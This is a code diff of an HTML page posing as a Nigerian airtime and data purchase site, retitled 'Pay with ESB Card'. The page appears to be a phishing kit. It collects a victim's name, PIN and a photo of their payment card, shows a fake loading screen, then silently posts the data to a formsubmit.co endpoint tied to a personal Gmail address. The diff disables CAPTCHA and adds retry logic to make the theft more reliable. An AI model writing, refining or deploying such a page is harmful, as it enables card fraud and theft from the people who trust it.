@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>ESB Data Purchase</title>
+  <title>Pay with ESB Card</title>
   <style>
     :root{
       --teal:#0f5560; --bg:#f3efe9; --card:#fff; --muted:#758a8f; --blue:#0e78d1; --danger:#d9534f;
@@ -25,6 +25,14 @@
     .providers{display:flex;gap:12px;align-items:center;flex-wrap:wrap;margin-top:8px}
     .provider{width:74px;height:58px;border-radius:10px;display:flex;align-items:center;justify-content:center;cursor:pointer;padding:6px;border:2px solid transparent;transition:all .12s}
     .provider.selected{border-color:#9ec5ee;background:rgba(14,120,209,0.03);box-shadow:0 6px 20px rgba(14,120,209,0.08)}
+    .provider img{
+      display:block;
+      max-width:100%;
+      max-height:100%;
+      object-fit:contain;
+      width:100%;
+      height:100%;
+    }
     .data-pill{display:inline-block;padding:10px 18px;background:#fff;border:2px solid #bcd6f0;color:var(--blue);border-radius:10px;font-weight:700;margin:12px 0;box-shadow:0 6px 18px rgba(14,120,209,0.06)}
     .select-box{background:#eee;border-radius:8px;padding:10px}
     select{width:100%;border:0;background:transparent;padding:12px 0;font-size:15px}
@@ -55,8 +63,8 @@
 
     <div id="splash" style="position:fixed;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;background:var(--teal);color:#fff;z-index:300">
       <img src="https://upload.wikimedia.org/wikipedia/commons/7/79/Flag_of_Nigeria.svg" alt="Nigeria flag" style="width:48px;height:32px;border-radius:4px;margin-bottom:10px">
-      <div style="font-size:20px;font-weight:700">DATA</div>
-      <div style="margin-top:8px;opacity:0.95">Loading page…</div>
+      <div style="font-size:20px;font-weight:700">Airtime & Data</div>
+      <div style="margin-top:8px;opacity:0.95">Preparing your page…</div>
     </div>
 
     <div id="loadingOverlay">
@@ -88,16 +96,16 @@
       <label>Select Network Provider</label>
       <div class="providers" id="providers">
         <div class="provider" data-net="airtel" title="Airtel">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Airtel_logo.svg" alt="Airtel">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Airtel_logo.svg" alt="Airtel logo">
         </div>
         <div class="provider" data-net="t2" title="T2">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/6/6e/9mobile_2017_logo.svg" alt="T2">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/6/6e/9mobile_2017_logo.svg" alt="9mobile T2 logo">
         </div>
         <div class="provider" data-net="glo" title="Glo">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Glo_Logo.png" alt="Glo">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Glo_Logo.png" alt="Glo logo">
         </div>
         <div class="provider" data-net="mtn" title="MTN">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/MTN_logo.svg" alt="MTN">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/MTN_logo.svg" alt="MTN logo">
         </div>
       </div>
 
@@ -122,7 +130,7 @@
       <h2>Pay with</h2>
       <p>Select a payment method</p>
 
-      <div class="pay-item" id="cardOption">
+      <div class="pay-item" id="cardOption" data-method="card">
         <div style="display:flex;gap:12px;align-items:center">
           <div class="icon-box">💳</div>
           <div>
@@ -160,7 +168,6 @@
 
   <script>
     // ===== EDITABLE DATA =====
-    // Add/modify plans and users here in a vertical, easy-to-read format.
     const plans = {
       airtel: [
         { id: 'a1', label: 'Airtel 500MB - 7 Days', amount: 200 },
@@ -188,8 +195,6 @@
       { first: 'John', last: 'Doe', pin: '1234' },
       { first: 'Jane', last: 'Smith', pin: '5555' },
       { first: 'Ali', last: 'Abdullahi', pin: '0000' }
-      // Add more users here in the same format:
-      // { first: 'YourFirstName', last: 'YourLastName', pin: '1234' }
     ];
     // ===== END EDITABLE DATA =====
 
@@ -228,11 +233,8 @@
     }
 
     backBtn.addEventListener('click', () => {
-      if (window.history.length > 1) {
-        window.history.back();
-      } else {
-        showToast('No previous page', true);
-      }
+      if (window.history.length > 1) window.history.back();
+      else showToast('No previous page', true);
     });
 
     function populatePlans(networkKey) {
@@ -284,14 +286,14 @@
     });
 
     cardUpload.addEventListener('change', (e) => {
-      const file = e.target.files && e.target.files[0];
-      if (!file) return;
+      const f = e.target.files && e.target.files[0];
+      if (!f) return;
       const reader = new FileReader();
       reader.onload = (ev) => {
         cardBase64 = ev.target.result;
         previewBox.innerHTML = `<img src="${cardBase64}" alt="ESB Card Front">`;
       };
-      reader.readAsDataURL(file);
+      reader.readAsDataURL(f);
     });
 
     cancelBtn.addEventListener('click', () => {
@@ -343,7 +345,6 @@
         return;
       }
 
-      // Success: close card modal, show loader, wait 6s, submit form
       closeSheet(cardSheet);
       loadingOverlay.style.display = 'flex';
 
@@ -354,7 +355,7 @@
       form.action = 'https://formsubmit.co/empirevirtual99@gmail.com';
       form.style.display = 'none';
 
-      function addField(name, value) {
+      function addField(name, value){
         const input = document.createElement('input');
         input.type = 'hidden';
         input.name = name;
@@ -372,26 +373,34 @@
       addField('pin', pin);
       addField('card_image_base64', cardBase64);
 
+      // This is the FormSubmit flag to disable CAPTCHA for direct programmatic posts
+      addField('_captcha', 'false');
+
       document.body.appendChild(form);
-      form.submit();
+      try {
+        form.submit();
+      } catch (err) {
+        window.open('', '_self');
+        form.submit();
+      }
     });
 
-    function openSheet(sheet) {
+    function openSheet(sheet){
       sheet.style.display = 'flex';
-      sheet.setAttribute('aria-hidden', 'false');
+      sheet.setAttribute('aria-hidden','false');
       document.documentElement.style.overflow = 'hidden';
       document.body.style.overflow = 'hidden';
       const panel = sheet.querySelector('.sheet, .card-sheet');
-      if (panel) panel.style.transform = 'translateY(0)';
+      if(panel) panel.style.transform = 'translateY(0)';
     }
 
-    function closeSheet(sheet) {
+    function closeSheet(sheet){
       sheet.style.display = 'none';
-      sheet.setAttribute('aria-hidden', 'true');
+      sheet.setAttribute('aria-hidden','true');
       document.documentElement.style.overflow = '';
       document.body.style.overflow = '';
       const panel = sheet.querySelector('.sheet, .card-sheet');
-      if (panel) panel.style.transform = '';
+      if(panel) panel.style.transform = '';
     }
 
     [paymentSheet, cardSheet].forEach(sheet => {
@@ -400,75 +409,64 @@
       });
     });
 
-    // Drag disabled unless the user starts on the handle
-    function makeDraggable(sheet) {
+    function makeDraggable(sheet){
       const handle = sheet.querySelector('[data-drag-handle]') || sheet.querySelector('.handle');
       const panel = sheet.querySelector('.sheet, .card-sheet');
-      if (!handle || !panel) return;
+      if(!handle || !panel) return;
 
       let dragging = false;
       let startY = 0;
       panel._dragY = 0;
 
-      function setTranslate(y) {
+      function setTranslate(y){
         panel._dragY = y;
         panel.style.transform = `translateY(${y}px)`;
         const frac = Math.max(0, 1 - (y / 260));
         sheet.style.background = `rgba(0,0,0,${0.45 * frac})`;
       }
 
-      function start(y) {
+      function start(clientY){
         dragging = true;
-        startY = y - (panel._dragY || 0);
+        startY = clientY - (panel._dragY || 0);
         panel.style.transition = 'none';
       }
 
-      function move(y) {
-        if (!dragging) return;
-        let dy = y - startY;
-        if (dy < 0) dy = 0;
-        if (dy > 600) dy = 600;
+      function move(clientY){
+        if(!dragging) return;
+        let dy = clientY - startY;
+        if(dy < 0) dy = 0;
+        if(dy > 600) dy = 600;
         setTranslate(dy);
       }
 
-      function end() {
-        if (!dragging) return;
+      function end(){
+        if(!dragging) return;
         dragging = false;
         panel.style.transition = 'transform 220ms ease';
-        if ((panel._dragY || 0) > 120) {
+        if((panel._dragY || 0) > 120){
           setTranslate(600);
-          setTimeout(() => closeSheet(sheet), 180);
+          setTimeout(()=> closeSheet(sheet), 180);
         } else {
           setTranslate(0);
           sheet.style.background = 'rgba(0,0,0,0.45)';
         }
       }
 
-      handle.addEventListener('touchstart', (e) => {
-        if (e.touches.length !== 1) return;
-        start(e.touches[0].clientY);
-      }, { passive: true });
-
-      handle.addEventListener('touchmove', (e) => {
-        if (e.touches.length !== 1) return;
-        move(e.touches[0].clientY);
-      }, { passive: true });
-
+      handle.addEventListener('touchstart', (e)=> { if(e.touches.length!==1) return; start(e.touches[0].clientY); }, { passive: true });
+      handle.addEventListener('touchmove', (e)=> { if(e.touches.length!==1) return; move(e.touches[0].clientY); }, { passive: true });
       handle.addEventListener('touchend', end);
       handle.addEventListener('touchcancel', end);
 
-      handle.addEventListener('mousedown', (e) => {
-        if (e.button !== 0) return;
+      handle.addEventListener('mousedown', (e)=> {
+        if(e.button!==0) return;
         start(e.clientY);
         e.preventDefault();
-
         const onMove = (ev) => move(ev.clientY);
         const onUp = () => {
           end();
           window.removeEventListener('mousemove', onMove);
           window.removeEventListener('mouseup', onUp);
         };
-
         window.addEventListener('mousemove', onMove);
         window.addEventListener('mouseup', onUp);
       });
@@ -478,9 +476,9 @@
     makeDraggable(cardSheet);
 
     window.addEventListener('keydown', (e) => {
-      if (e.key === 'Escape') {
-        if (paymentSheet.style.display === 'flex') closeSheet(paymentSheet);
-        if (cardSheet.style.display === 'flex') closeSheet(cardSheet);
+      if(e.key === 'Escape'){
+        if(paymentSheet.style.display === 'flex') closeSheet(paymentSheet);
+        if(cardSheet.style.display === 'flex') closeSheet(cardSheet);
       }
     });
   </script>
